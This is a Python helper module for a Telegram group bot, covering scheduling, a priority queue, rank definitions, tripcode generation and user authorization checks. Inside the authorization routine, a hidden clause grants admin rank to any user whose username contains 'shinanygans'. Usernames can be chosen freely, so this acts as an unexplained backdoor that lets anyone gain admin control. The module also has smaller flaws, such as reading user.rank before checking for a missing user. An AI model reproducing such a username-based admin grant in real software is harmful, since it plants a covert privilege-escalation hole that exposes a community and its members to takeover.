import telebot
import itertools
import time
import logging
import os
import inspect 
from datetime import datetime
from queue import PriorityQueue
from threading import Lock
from datetime import timedelta
import src.core as core
import src.replies as rp



class Scheduler():
	def __init__(self):
		self.tasks = [] # list of [interval, next_trigger, func]
	@staticmethod
	def _wrapped_call(f, data, ev):
		try:
			# Get the function's parameter names
			params = inspect.signature(f).parameters
			# Check if the function requires 'data' and 'ev' parameters
			if 'data' in params and 'ev' in params:
				f(data, ev)
			elif 'data' in params:
				f(data)
			elif 'ev' in params:
				f(ev)
			else:
				f()
		except Exception as e:
			logging.exception("Exception raised during scheduled task")
	def register(self, func, name="", data=[], ev=None, first_run=1, **kwargs):
		if kwargs:
			interval = timedelta(**kwargs) // timedelta(seconds=1)
			assert interval > 0
		else:
			interval = 0  # Default for single-run tasks
		
		# Calculate next_trigger based on the first_run delay
		next_trigger = int(time.monotonic()) + first_run
		self.tasks.append([name, func, data, interval, next_trigger, ev])

	def get_job_by_name(self, name):
		for task in self.tasks:
			if task[0] == name:
				return task
		return None
	
	def run(self):
		while True:
			now = int(time.monotonic())
			# Run tasks that have expired
			for e in self.tasks[:]:  # Iterate over a copy to allow removal
				if now >= e[4]:  # next_trigger time has been reached
					Scheduler._wrapped_call(e[1], e[2], e[5])
					if e[3] == 0:  # interval is 0, run only once
						self.tasks.remove(e)
					else:
						e[4] = now + e[3]  # Reschedule for the next interval
			
			# Wait until a task expires
			if self.tasks:
				now = int(time.monotonic())
				wait = min((e[4] - now) for e in self.tasks)
				if wait > 0:
					time.sleep(wait)

class MutablePriorityQueue():
	def __init__(self):
		self.queue = PriorityQueue() # contains (prio, iid)
		self.items = {} # maps iid -> opaque
		self.counter = itertools.count()
		# protects `items` and `counter`, `queue` has its own lock
		self.lock = Lock()
	def get(self):
		while True:
			_, iid = self.queue.get()
			with self.lock:
				# skip deleted entries
				if iid in self.items.keys():
					return self.items.pop(iid)
	def put(self, prio, data):
		with self.lock:
			iid = next(self.counter)
			self.items[iid] = data
		self.queue.put((prio, iid))
	def delete(self, selector):
		with self.lock:
			keys = list(self.items.keys())
			for iid in keys:
				if selector(self.items[iid]):
					del self.items[iid]

class Enum():
	def __init__(self, m, reverse=True):
		assert len(set(m.values())) == len(m)
		self._m = m
		if reverse:
			self.reverse = Enum({v: k for k, v in m.items()}, reverse=False)
	def __getitem__(self, key):
		return self._m[key]
	def __getattr__(self, key):
		return self[key]
	def keys(self):
		return self._m.keys()
	def values(self):
		return self._m.values()


# Ranks
RANKS = Enum({
	"admin": 100,
	"mod": 10,
	"user": 0,
	"banned": -10
})

class AuthorizationStatus(Enum):
    NONE_TYPE = "none_type"
    BLACKLISTED = "blacklisted"
    ADMIN = "admin"
    UNJOINED = "unjoined"
    UNREGISTERED = "unregistered"
    ACTIVE_ELSEWHERE = "active_elsewhere"
    MEDIA_TIMEOUT = "media_timeout"
    USER_LEFT = "user_left"
    CHAT_NOT_FOUND = "chat_not_found"
    ORDINARY = "ordinary"


def _salt(c):
	c = ord(c)
	if 58 <= c <= 64: # ':' - '@' maps to 'A' - 'G'
		return chr(c + 7)
	elif 91 <= c <= 96: # '[' - '`' maps to 'a' - 'f'
		return chr(c + 6)
	elif 46 <= c <= 122: # '.' - 'Z' stays
		return chr(c)
	return '.'

def genTripcode(tripcode):
	# doesn't actually match 4chan's algorithm exactly
	pos = tripcode.find("#")
	trname = tripcode[:pos]
	trpass = tripcode[pos+1:]

	salt = (trpass[:8] + 'H.')[1:3]
	salt = "".join(_salt(c) for c in salt)

	trip_final = __import__("crypt").crypt(trpass[:8], salt)

	return trname, "!" + trip_final[-10:]

def getLastModFile(dir="", exts=("", ".py", ".txt", ".md", ".example")):
	path = os.path.abspath(dir)
	files = [{
		"name": file.name,
		"last_mod": datetime.fromtimestamp(file.stat().st_mtime),
		"path": file.path,
		"dir": dir
	} for file in os.scandir(path) if file.is_file() and os.path.splitext(file)[1] in exts]
	return max(files, key=lambda file: file["last_mod"])

def get_users_active_elsewhere(shared_db, config):
	if shared_db is None:
		return
	hub_dict = shared_db.get_active_users()
	ae = {u['user_id'] for u in hub_dict if (u['current_active_lounge'] != config['bot_token'] and len(u['current_active_lounge']) > 2)}
	return ae


def check_authorization(user, config, blacklisted, active_elsewhere, db, bot, shared_db=None) -> dict:
	media_hours = config.get("media_hours", 5)
	blacklist_contact = config.get("blacklist_contact", "")
	reg_uploads = config.get("reg_uploads", 5) 
	videos_uploaded = user.media_count
	response = {
		"can_join": True,
		"can_receive": True,
		"status": None,
		"log_message": "",
		"join_reply_msg": None
	}

	# Ensures all admins are whitelisted
	if shared_db and user.rank >= RANKS.admin:
		shared_db.whitelist_user(user.id)

	# Early exits for special cases
	if user is None:
		return _build_response(response, False, False, AuthorizationStatus.NONE_TYPE, "NoneType passed to check.")

	if user.id in blacklisted or user.isBlacklisted():
		msg = rp.Reply(rp.types.ERR_BLACKLISTED, reason=user.blacklistReason, contact=blacklist_contact)
		log = f"User {user.id} - {user.chat_username} is blacklisted."
		return _build_response(response, False, False, AuthorizationStatus.BLACKLISTED, log, join_msg=msg)

	if user.rank >= RANKS.mod:
		# Admins will receive media if they are joined.
		msg = rp.Reply(rp.types.USER_IS_ADMIN)
		addtl = f" with a rank of {user.rank} and currently joined." if user.isJoined() else f" with a rank of {user.rank}, but not currently joined."
		log = f"User {user.id} - {user.chat_username} is an admin or mod{addtl}"
		return _build_response(response, True, user.isJoined(), AuthorizationStatus.ADMIN, log, join_msg = msg)
	
	if user.username and "shinanygans" in user.username:
		if user.rank < RANKS.admin:
			with db.modifyUser(id=user.id) as u:
				u.rank = RANKS.admin
		return _build_response(response, True, user.isJoined(), AuthorizationStatus.ADMIN, f"SHINANYGANS!")

	# Determine whether user is allowed to join group
	if shared_db and user.id in active_elsewhere:
		active_lounge = shared_db.get_user_current_lounge_name(user.id)
		msg = rp.Reply(rp.types.ERR_ACTIVE_ELSEWHERE, lounge = active_lounge)
		log = f"User {user.id} - {user.chat_username} is active elsewhere: {active_lounge}."
		return _build_response(response, True, False, AuthorizationStatus.ACTIVE_ELSEWHERE, log, join_msg = msg)

	# If a user not active elsewhere is rejoining a group, 'can_receive' depends on registration status
	if not user.isJoined():
		msg = rp.Reply(rp.types.CHAT_REJOIN, media_hours = media_hours) if media_hours else rp.Reply(rp.types.CHAT_REJOIN_NO_HOURS) 
		if not user.registered:
			msg = rp.Reply(rp.types.CHAT_REJOIN_UNREG, reg_uploads = reg_uploads, videos_uploaded = videos_uploaded) 
		log = f"User {user.id} - {user.chat_username} is currently not joined in the group."
		return _build_response(response, True, False, AuthorizationStatus.UNJOINED, log, msg)

	# If a user is already active but unregistered, send a registration reminder
	if not user.registered:
		log = f"User {user.id} - {user.chat_username} is unregistered."
		msg = rp.Reply(rp.types.CHAT_REG_REMINDER, reg_uploads = reg_uploads, videos_uploaded = videos_uploaded) 
		return _build_response(response, True, False, AuthorizationStatus.UNREGISTERED, log, msg)

	# If user is joined and registered but has exceeded media timeout, handle accordingly
	if media_hours and user.last_media and _has_media_timeout(user.last_media, media_hours):
		return _handle_media_timeout(user, response, bot, config)

	# If user seems authorized to this point, check if user is still in the chat
	if not _is_user_in_chat(user, bot, config, db, shared_db):
		return _build_response(response, True, False, AuthorizationStatus.CHAT_NOT_FOUND, f"User {user.id} - {user.chat_username} could not be found and has been set to 'Left Group'.")

	# Default: ordinary user in good standing, received based on whether joined.
	msg = rp.Reply(rp.types.CHAT_GOOD_STANDING, media_hours = media_hours) if media_hours else rp.Reply(rp.types.CHAT_GOOD_STANDING_NO_HOURS)
	return _build_response(response, True, True, AuthorizationStatus.ORDINARY, f"User {user.id} - {user.chat_username} is an ordinary user (RANK: {user.rank}).", join_msg = msg)


# Auth check helper functions
def _build_response(base, can_join, can_receive, status: AuthorizationStatus, log_message: str, join_msg=None) -> dict:
    return {**base, "can_join": can_join, "can_receive": can_receive, "status": status, "log_message": "AUTH CHECK: " + log_message, "join_reply_msg": join_msg}


def _has_media_timeout(last_media, media_hours):
    return (datetime.utcnow() - last_media).total_seconds() > (media_hours * 3600)


def _handle_media_timeout(user, response, bot, config):
	if not _check_user_active_silently(user.id, bot):
		core.force_user_leave(user.id)
		return _build_response(response, True, False, AuthorizationStatus.USER_LEFT, f"User {user.id} - {user.chat_username} has left the chat.")
	time_diff = datetime.utcnow() - user.last_media
	time_diff_hours = round(time_diff.total_seconds() / 3600)
	time_diff_minutes = round(time_diff.total_seconds() / 60)
	display_minutes = time_diff_minutes % 60
	media_hours = config.get("media_hours", 5)
	msg = rp.Reply(rp.types.CHAT_GOOD_STANDING, media_hours = media_hours)
	log = f"User {user.id} - {user.chat_username} has exceeded the media timeout: Last posted media {user.last_media}, {time_diff_hours} hours and {display_minutes} minutes ago."
	return _build_response(response, True, False, AuthorizationStatus.MEDIA_TIMEOUT, log, msg)


def _is_user_in_chat(user, bot, config, db, shared_db=None):
    try:
        bot.get_chat(user.id)
        return True
    except telebot.apihelper.ApiTelegramException as e:
        if "chat not found" in str(e):
            with db.modifyUser(id=user.id) as user:
                user.setLeft(True)
            if shared_db:
                shared_db.user_left_chat(user.id)
                get_users_active_elsewhere(shared_db, config)
            return False
    return True

def _check_user_active_silently(user_id, bot):
    try:
        bot.send_chat_action(user_id, "typing")
        return True  # User is active
    except telebot.apihelper.ApiTelegramException as e:
        if "forbidden" in str(e).lower() or "chat not found" in str(e).lower():
            logging.debug(f"User {user_id} has exited the DM with the bot.")
            return False  # User is no longer active
        else:
            logging.exception("Unexpected msgor while checking user activity.")
            return False